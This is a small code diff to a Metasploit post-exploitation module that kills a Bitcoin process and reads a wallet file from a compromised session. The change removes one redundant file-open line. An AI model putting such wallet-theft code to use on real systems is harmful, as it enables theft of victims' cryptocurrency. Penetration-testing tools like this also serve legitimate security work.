@@ -49,7 +49,6 @@ class Metasploit3 < Msf::Post
 		kill_bitcoin
 
 		begin
-			wallet = session.fs.file.new(filename, "rb")
 			data = read_file(filename) || ''
 		rescue ::Exception => e
 			print_error("Failed to download #{filename}: #{e.class} #{e}")
